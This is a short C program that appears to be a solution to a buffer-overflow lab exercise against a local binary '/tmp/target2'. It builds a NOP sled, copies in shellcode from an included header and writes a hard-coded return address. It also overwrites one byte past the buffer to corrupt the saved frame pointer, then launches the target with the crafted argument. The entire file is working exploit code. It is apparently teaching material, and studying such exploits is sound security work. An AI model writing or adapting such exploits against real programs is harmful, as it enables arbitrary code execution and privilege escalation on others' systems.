#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP 0x90


int main(void)
{
  char *args[3];
  char *env[1];
  char solong[202];
  int i; 
  for(i=0;i<200;i++)
  {
     solong[i]=NOP;
  }
  memcpy(solong+200-4-strlen(shellcode),shellcode,strlen(shellcode));
  *(int *)(solong+200-4)=0xbffffc90;
  solong[200]=0x50;
  solong[201]=0;  
args[1]=solong;
  args[0] = TARGET; 
 args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
